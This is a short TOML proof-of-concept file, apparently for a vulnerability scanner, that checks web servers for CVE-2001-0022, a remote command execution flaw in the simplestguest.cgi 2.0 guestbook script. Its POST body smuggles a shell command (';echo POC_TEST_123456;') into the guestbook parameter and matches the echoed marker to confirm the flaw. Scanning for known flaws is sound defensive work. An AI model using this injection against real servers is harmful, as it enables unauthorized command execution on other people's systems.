[info]
author = "ave"
description = "验证 Leif M. Wright simplestguest.cgi 2.0 远程命令执行漏洞，通过 guestbook 参数注入 Shell 元字符执行任意命令"
id = "POC-AVE-2001-0009"
name = "CVE-2001-0022 PoC"
severity = "critical"
tags = ["ave-2001-0009"]
vuln_id = [
    "CVE-2001-0022",
    "AVE-2001-0009",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/simplestguest.cgi"
protocol = "http"

[poc.requests.body]
content = "guestbook=;echo POC_TEST_123456;&action=sign&name=test&email=test@test.com&url=http://test.com"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["POC_TEST_123456"]
